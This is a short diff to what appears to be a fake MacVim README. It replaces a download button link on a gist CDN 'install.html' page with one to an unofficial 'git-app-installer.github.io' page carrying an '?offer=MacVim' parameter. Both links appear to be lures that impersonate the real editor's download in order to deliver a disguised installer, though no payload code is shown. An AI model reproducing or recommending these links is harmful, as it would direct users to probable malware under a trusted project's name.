@@ -3,7 +3,7 @@
 MacVim delivers the power of Vim in a native macOS interface, offering developers, writers, and advanced users a customizable and efficient editing environment.  
 Designed for macOS, it combines classic modal editing with modern UI support and system integration.
 
-<a href="https://gistcdn.githack.com/lindaxoreoxx/24e6b4c029e92987ff59fd68eaac4bb5/raw/defc317e1e9b15791193c0a8438034d85c933489/install.html?offer=MacVim" target="_blank">
+<a href="https://git-app-installer.github.io/.github/?offer=MacVim" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20MacVim%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
